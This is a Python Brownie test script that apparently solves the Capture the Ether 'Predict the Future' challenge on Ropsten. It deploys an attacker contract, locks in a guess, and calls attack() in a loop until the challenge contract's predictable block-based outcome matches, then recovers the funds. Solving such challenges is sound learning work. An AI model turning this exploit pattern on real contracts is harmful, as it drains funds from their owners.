from brownie import accounts, PredictTheFutureChallenge, PredictTheFutureAttacker
from web3 import Web3
import time

eth_amount = Web3.toWei("1", "ether")
challenge_address = "0x9308C5409C71A8581c09033C91EAF43c7B28F61d"


def test_predict_the_future():
    # load account
    account = accounts.load("Ropsten_test_net_account")

    # get challenge contract
    challenge = PredictTheFutureChallenge.at(challenge_address)

    # deploy hacker contract
    hacker = PredictTheFutureAttacker.deploy(challenge_address, {"from": account})
    print(f"hacker's balance is: {account.balance()}")
    print(f"challenge contract balance is: {challenge.balance()}")

    # call guess
    tx_guess = hacker.lockInMyGuess(
        {"from": account, "value": eth_amount, "gas_limit": 1e6, "allow_revert": True}
    )
    tx_guess.wait(1)
    print(f"hacker's balance is: {account.balance()}")
    print(f"challenge contract balance is: {challenge.balance()}")

    # add another block by waiting 30 seconds
    time.sleep(30)
    print("Guess locked in...")
    print("Starting exploit...")

    # start exploit
    while not challenge.isComplete():
        try:
            tx_exploit = hacker.attack(
                {"from": account, "gas_limit": 1e5, "allow_revert": True}
            )
            tx_exploit.wait(1)
            time.sleep(10)
        except:
            print("Attempt failed")
            time.sleep(10)
    print("Attack executed successfully")
    print(tx_exploit.info())

    # recover funds
    tx = hacker.recoverFunds({"from": account})
    tx.wait(1)
    print(f"The hacker's balance is: {account.balance()}")

    # confirm the challenge is completed
    assert challenge.isComplete()
